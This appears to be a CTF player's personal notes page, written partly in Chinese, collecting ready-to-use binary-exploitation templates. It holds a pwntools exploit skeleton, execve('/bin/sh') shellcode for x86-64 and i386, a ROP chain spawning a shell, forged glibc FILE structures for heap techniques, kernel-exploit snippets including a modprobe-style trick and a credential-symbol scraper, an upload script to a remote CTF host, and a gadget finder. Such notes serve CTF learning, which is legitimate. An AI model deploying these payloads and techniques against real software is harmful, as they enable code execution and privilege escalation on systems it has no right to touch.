---
title: NOTES
date: 2022-06-06 00:00:00
tags:
---

我把一些有用的template和payload放在这里可以直接拿来使用。

## USER PWN

* overflow help string

`AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllllmmmmmmmmnnnnnnnnooooooooppppppppqqqqqqqqrrrrrrrrssssssssttttttttuuuuuuuuvvvvvvvvwwwwwwwwxxxxxxxxyyyyyyyyzzzzzzzz`

`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz`

* exp template

```python
#!/usr/bin/env python
#_*_coding:utf-8_*_
from pwn import *
local = 1
debug = 1
binary = "./pwn_patched"
lib = "/home/giles/tools/glibc-all-in-one/libs/2.34-0ubuntu3.2_amd64/libc.so.6"
elf = ELF(binary)
context.arch = 'amd64'
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("ip","port")
    # lib = "./libc-2.27.so"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins, arch="amd64"), executable = True).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)
protect= lambda pos, ptr   : ((pos>>12)^(ptr))
mangle = lambda var, guard : (((var^guard)<<0x11) + ((var^guard)>>(64-0x11))) & ((1<<64)-1)

def ggdb():
    cmd = ""
    cmd += "#!/bin/sh\n"
    cmd += "gdb -p `pidof %s` -q "%(binary)
    # cmd += "-ex 'b *$rebase(0x0000000000014DB)' "
    # cmd += "-ex 'b *0x40013a' "
    with open("./gdb.sh",'w') as f:
        f.write(cmd)
    os.system("chmod +x ./gdb.sh")
ggdb()

sh()

```

* shellcode

```python

# x86-64

shell = '''
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
mov rax,0x3b
syscall
'''
shell = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05"
# shell = asm(shell,arch="amd64")
# print("".join("\\x%02x"%ord(_) for _ in shell))

code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# xor    eax,eax
# movabs rbx,0xff978cd091969dd1
# neg    rbx
# push   rbx
# push   rsp
# pop    rdi
# cdq    
# push   rdx
# push   rdi
# push   rsp
# pop    rsi
# mov    al,0x3b
# syscall 



# i386

shell = '''
push 0x68732f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
mov eax,0xb
int 0x80
'''
# shell= asm(shell,arch = "i386")
shell= "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80"
# print("".join("\\x%02x"%ord(_) for _ in shell))
```

* useful segment

```python
payload = ""
payload += "A"*0x48
payload += p64(canary)
payload += "V"*8
payload += p64(gadget("pop rdi;ret"))
payload += p64(libc.search("/bin/sh\x00").next())
payload += p64(gadget("pop rsi;ret"))
payload += p64(0)
payload += p64(gadget("pop rdx;ret"))
payload += p64(0)
payload += p64(gadget("pop rax;ret"))
payload += p64(0x3b)
payload += p64(gadget("syscall;ret"))
```

* utils
```python
class FILE:
    def __init__(self):
        self.flags = 0
        self.IO_read_ptr = 0
        self.IO_read_end = 0
        self.IO_read_base = 0
        self.IO_write_base = 0
        self.IO_write_ptr = 0
        self.IO_write_end = 0
        self.IO_buf_base = 0
        self.IO_buf_end = 0
        self.IO_save_base = 0
        self.IO_backup_base = 0
        self.IO_save_end = 0
        self.markers = 0
        self.chain = 0
        self.fileno = 0
        self.flags2 = 0
        self.old_offset = 0
        self.cur_column = 0
        self.vtable_offset = 0
        self.shortbuf = 0
        self.lock = 0
        self.offset = 0
        self.codecvt = 0
        self.wide_data = 0
        self.freeres_list = 0
        self.freeres_buf = 0
        self.pad5 = 0
        self.mode = 0
        self.unused2 = ""
        self.vtable = 0     
    def __str__(self):
        ret = ""
        ret += p64(self.flags) + p64(self.IO_read_ptr) + p64(self.IO_read_end) + p64(self.IO_read_base)
        ret += p64(self.IO_write_base) + p64(self.IO_write_ptr) + p64(self.IO_write_end) + p64(self.IO_buf_base)
        ret += p64(self.IO_buf_end) + p64(self.IO_save_base) + p64(self.IO_backup_base) + p64(self.IO_save_end)
        ret += p64(self.markers) + p64(self.chain) + p32(self.fileno) + p32(self.flags2) + p64(self.old_offset)
        ret += p16(self.cur_column) + p8(self.vtable_offset) + p8(self.shortbuf) + p32(0) + p64(self.lock) + p64(self.offset)
        ret += p64(self.codecvt) + p64(self.wide_data) + p64(self.freeres_list) + p64(self.freeres_buf) + p64(self.pad5)
        ret += p32(self.mode) + self.unused2.ljust(20, "\x00")
        ret += p64(self.vtable)
        return ret

# house of apple
file = FILE()
file.IO_write_ptr = 0xdead                       # a big num
file.vtable = libc.address + 0x1e1c60            # pointer to _IO_wstrn_jumps
file.wide_data = libc.address + 0x1ed600 + 0x30  # pointer to pointer_guard
file.flags2 = 8 
file.chain = heap + 0x2a0                        # link to next file

# house of pig
file = FILE()
file.IO_write_ptr = 0xdead                   # a big num
file.vtable = libc.address + 0x1e9560        # offset to _IO_str_jumps
file.IO_buf_base = heap + 0x13198            # pointer to prepared buf
file.IO_buf_end = file.IO_buf_base + 0x1e    # 0x1e = (size - 100) / 2

# house of emma
file = FILE()
file.lock = heap                                # writtable
file.vtable = libc.address + 0x215b80 + 0x50    # offset to _IO_cookie_close
payload = str(file)[0x10:]
payload += p64(context_addr)                 # cookie
payload += p64(mangle(libc.address + \       # mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]
        0x0000000000165d60 + 576, heap+0x2ae0))*4

```

## KERNEL PWN
*  

1. `cpio -i --no-absolute-filenames -F ../rootfs.cpio`

* useful segment

```c
#define stop(msg)    { write(1, msg, strlen(msg)); getchar(); }

system("echo -ne '#!/bin/sh\n/bin/chmod o+r /flag' > /tmp/x");
system("chmod +x /tmp/x");
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
system("chmod +x /tmp/dummy");

system("/tmp/dummy");
system("cat /flag.txt");

void print(uint64_t *ptr, unsigned long len)
{
    for(int i=0; i <= len/8; i++)
    {
        printf("[%02x] %04llx => %016llx \n",i,i*8,ptr[i]);
    }
}

void shell() {
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}

```

* init

```bash
cp /proc/kallsyms kallsyms
cat /proc/modules >> sym
grep -wE '_text|prepare_kernel_cred|commit_creds|_einittext' /proc/kallsyms >> sym
grep -r "0x" /sys/module/kstack/sections > sections

```


* pack.sh

```c
#!/bin/sh
gcc -o poc -static -w poc.c -lpthread
gcc -o exp -static -w exp.c -lpthread
cp poc extract/
cp exp extract/
cd extract/
find . | cpio -o --format=newc > ../rootfs.cpio
cd ../
```

* gdb.sh

```Bash
#!/bin/sh
gdb -q \
    -ex "set architecture i386:x86-64 " \
    -ex "add-symbol-file vmlinux 0xffffffff81000000"  \
    -ex "add-symbol-file kstack.ko 0xffffffffc0000000  \
                                -s .bss 0xffffffffc00022c0  \
                                -s .rodata 0xffffffffc0001040 " \
    -ex "gef-remote --qemu-mode localhost:1234 " \
    -ex "b *(0xffffffff8113e1cc) " \
    -ex "b *(0xffffffffc0000000+0x8b) " \
    -ex "b *(0xffffffffc0000000+0xA7) " 
```
* upload.py

```python
#!/bin/sh
import os
from pwn import *

def cmd(cmd):
    io.sendline(cmd)
    buf = io.recvuntil("$ ")
    return buf

def pwn():
    SIZE = 0x200
    FILE = "exp" 
    
    md5 = os.popen("md5sum exp").read()
    with open("exp", "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    
    io.sendlineafter("$ ","cd /tmp")
    for i in range(0, len(encoded), SIZE):
        info("%d / %d" % (i, len(encoded)))
        cmd("echo \"%s\" >> /tmp/base" % (encoded[i:i+SIZE]))
    cmd("cat /tmp/base | base64 -d > /tmp/poc")
    cmd("chmod +x /tmp/poc")
    info("Done! md5 => %s"%md5)
    context.log_level = 'debug'
    io.sendlineafter("$ ","md5sum /tmp/poc")
    io.interactive()

if __name__ == '__main__':
    io = remote("node4.buuoj.cn", "28794")
    # io = process('./boot.sh', shell=True)
    pwn()

```

* kmagic

```python
#!/usr/bin/env python2
from pwn import *

reg = ("rax","rbx","rcx","rdx","rdi","rsi","rbp","rsp",\
                "r8","r9","r10","r11","r12","r13","r14","r15")
reg_success_pop = []

context.arch = 'amd64'
vm = ELF("./vmlinux")


def check_addr_in_section(section,addr):
        size = vm.get_section_by_name(section).header.sh_size
        FROM = vm.get_section_by_name(section).header.sh_addr
        TO       = FROM + size
        return (addr<TO) and (addr>FROM)

def print_pop():
        for register in reg:
                one = "pop %s ; ret"%(register)
                try:
                        addr = vm.search(asm(one)).next()
                        if(not check_addr_in_section('.text',addr)):
                                continue
                        reg_success_pop.append(register)
                except StopIteration:
                        continue
                print("0x%x  <=  %s"%(addr,one))

def print_mov():
        gadget = []
        for des in reg_success_pop:
                for src in reg_success_pop:
                        if((des == src) or (des == 'rsp') or (src == 'rsp')):
                                continue
                        one = "mov qword ptr [%s], %s ; ret"%(des,src)
                        gadget.append(one)
        for gg in gadget:
                try:
                        addr = vm.search(asm(gg)).next()
                        if(not check_addr_in_section('.text',addr)):
                                continue
                except StopIteration:
                        continue
                print("0x%x  <=  %s"%(addr,gg))


def misc_opt():
        misc = {}
        misc["xchg esp,eax;ret"] = asm("xchg esp,eax;ret")

        misc["swapgs; pop rbp; ret;"] = asm("swapgs; pop rbp; ret;")
        misc["swapgs ;popfq; ret"] = asm("swapgs ;popfq; ret")
        misc["swapgs ;ret"] = asm("swapgs ;ret")
        misc["swapgs"] = asm("swapgs")

        misc["iretq; pop rbp; ret;"] = asm("iretq; pop rbp; ret;")
        misc["iretq; ret"] = asm("iretq; ret")
        misc["iretq"] = asm("iretq")

        for key,value in misc.items():

                try:
                        addr = vm.search(value).next()
                        if(not check_addr_in_section('.text',addr)):
                                continue
                except StopIteration:
                        continue
                print("0x%x  <=  %s"%(addr,key))

        try:
                addr = vm.search("/sbin/modprobe").next()
                if(check_addr_in_section('.data',addr)):
                        print("\n0x%x  <=  %s\n"%(addr,"/sbin/modprobe"))
        except StopIteration:
                pass

misc_opt()
print("-"*0x40)
print_pop()
print("-"*0x40)
print_mov()
print("-"*0x40)
```

* kmem_caches

```c
const struct kmalloc_info_struct kmalloc_info[] __initconst = {
	INIT_KMALLOC_INFO(0, 0),
	INIT_KMALLOC_INFO(96, 96),
	INIT_KMALLOC_INFO(192, 192),
	INIT_KMALLOC_INFO(8, 8),
	INIT_KMALLOC_INFO(16, 16),
	INIT_KMALLOC_INFO(32, 32),
	INIT_KMALLOC_INFO(64, 64),
	INIT_KMALLOC_INFO(128, 128),
	INIT_KMALLOC_INFO(256, 256),
	INIT_KMALLOC_INFO(512, 512),
	INIT_KMALLOC_INFO(1024, 1k),
	INIT_KMALLOC_INFO(2048, 2k),
	INIT_KMALLOC_INFO(4096, 4k),
	INIT_KMALLOC_INFO(8192, 8k),
	INIT_KMALLOC_INFO(16384, 16k),
	INIT_KMALLOC_INFO(32768, 32k),
	INIT_KMALLOC_INFO(65536, 64k),
	INIT_KMALLOC_INFO(131072, 128k),
	INIT_KMALLOC_INFO(262144, 256k),
	INIT_KMALLOC_INFO(524288, 512k),
	INIT_KMALLOC_INFO(1048576, 1M),
	INIT_KMALLOC_INFO(2097152, 2M),
	INIT_KMALLOC_INFO(4194304, 4M),
	INIT_KMALLOC_INFO(8388608, 8M),
	INIT_KMALLOC_INFO(16777216, 16M),
	INIT_KMALLOC_INFO(33554432, 32M),
	INIT_KMALLOC_INFO(67108864, 64M)
};
/*
kmem_caches[0]    =>   0x00   =>    NULL  
kmem_caches[1]    =>   0x60   =>    kmalloc-96  
kmem_caches[2]    =>   0xc0   =>    kmalloc-192  
kmem_caches[3]    =>   0x08   =>    kmalloc-8  
kmem_caches[4]    =>   0x10   =>    kmalloc-16  
kmem_caches[5]    =>   0x20   =>    kmalloc-32  
kmem_caches[6]    =>   0x40   =>    kmalloc-64  
kmem_caches[7]    =>   0x80   =>    kmalloc-128  
kmem_caches[8]    =>  0x100   =>    kmalloc-256  
kmem_caches[9]    =>  0x200   =>    kmalloc-512  
kmem_caches[10]   =>  0x400   =>    kmalloc-1024 (kmalloc-1k)
kmem_caches[11]   =>  0x800   =>    kmalloc-2048 (kmalloc-2k)
kmem_caches[12]   => 0x1000   =>    kmalloc-4096 (kmalloc-4k)
*/
```

## OTHERS

